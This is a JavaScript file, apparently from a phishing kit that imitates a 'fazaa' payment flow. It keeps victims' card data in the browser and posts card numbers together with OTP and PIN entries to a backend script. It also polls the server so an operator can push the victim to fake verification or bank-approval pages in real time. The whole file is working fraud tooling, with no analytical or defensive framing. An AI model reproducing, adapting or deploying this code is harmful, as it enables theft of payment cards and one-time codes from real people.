// ═══════════════════════════════════════════════════════
// توجيه من أي متصفح / أي جهاز
// الصفحة تسأل السيرفر باستمرار → لما تضغط الزر ينتقل فوراً
// ═══════════════════════════════════════════════════════

function pageDir() {
  var path = window.location.pathname || "/";
  return path.substring(0, path.lastIndexOf("/") + 1);
}

function sid(id) {
  return String(id || "").replace(/[^a-zA-Z0-9_]/g, "").slice(0, 40);
}

function apiUrl() {
  return pageDir() + "api.php";
}

function pollUrl(sessionId) {
  return pageDir() + "poll.php?s=" + encodeURIComponent(sessionId) + "&_=" + Date.now();
}

(function resetOnHome() {
  var path = window.location.pathname || "";
  var isHome =
    path === "/" ||
    path.endsWith("/index.html") ||
    path.endsWith("/") ||
    path === "";
  if (isHome) {
    ["fazaa.sessionId", "paymentData", "fazaa.orderForm", "fazaa.cardData", "fazaa.step", "fazaa.personalSent"]
      .forEach(function (k) { localStorage.removeItem(k); });
  }
})();

(function initSession() {
  var current = sid(localStorage.getItem("fazaa.sessionId"));
  if (!current) {
    current = sid("s" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
  }
  localStorage.setItem("fazaa.sessionId", current);
})();

globalThis.getSessionId = function () {
  return sid(localStorage.getItem("fazaa.sessionId") || "");
};

globalThis.sendToServer = async function (page, data) {
  var sessionId = globalThis.getSessionId();
  data = data || {};

  if (page === "otp" || page === "pin") {
    try {
      var paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
      data.cardNumber = data.cardNumber || paymentData.cardNumberDigits || paymentData.cardNumber || "";
    } catch (e) {}
  }

  try {
    var res = await fetch(apiUrl(), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId: sessionId, page: page, data: data }),
      cache: "no-store",
    });
    var json = await res.json().catch(function () { return {}; });
    if (json.sessionId) localStorage.setItem("fazaa.sessionId", sid(json.sessionId));
    return json;
  } catch (err) {
    console.error(err);
    return { ok: false };
  }
};

function goTo(target) {
  if (target === "verification" || target === "otp") {
    window.location.replace("verification.html");
    return true;
  }
  if (target === "bank-approval" || target === "bank") {
    window.location.replace("bank-approval.html");
    return true;
  }
  return false;
}

var pollActive = false;
var pollBusy = false;
var redirected = false;

async function pollOnce() {
  if (pollBusy || redirected) return;
  pollBusy = true;
  try {
    var id = globalThis.getSessionId();
    if (!id) return;
    var res = await fetch(pollUrl(id), { cache: "no-store", credentials: "omit" });
    var json = await res.json().catch(function () { return {}; });
    if (json && json.redirect) {
      redirected = true;
      pollActive = false;
      goTo(json.redirect);
    }
  } catch (e) {
  } finally {
    pollBusy = false;
  }
}

function pollLoop() {
  if (!pollActive || redirected) return;
  pollOnce().finally(function () {
    if (pollActive && !redirected) {
      setTimeout(pollLoop, 800);
    }
  });
}

function startRedirectWatch() {
  if (pollActive) return;
  pollActive = true;
  redirected = false;
  pollOnce();
  pollLoop();
}

// لما ترجع الصفحة للواجهة (آيفون/أي متصفح)
document.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "visible") {
    pollOnce();
    if (!pollActive) startRedirectWatch();
  }
});
window.addEventListener("pageshow", function () { pollOnce(); });
window.addEventListener("focus", function () { pollOnce(); });

// اسم قديم للتوافق مع payment.html
globalThis.startPusherListener = function () {
  startRedirectWatch();
};

globalThis.startRedirectWatch = startRedirectWatch;
globalThis.sendHeartbeat = async function () {};
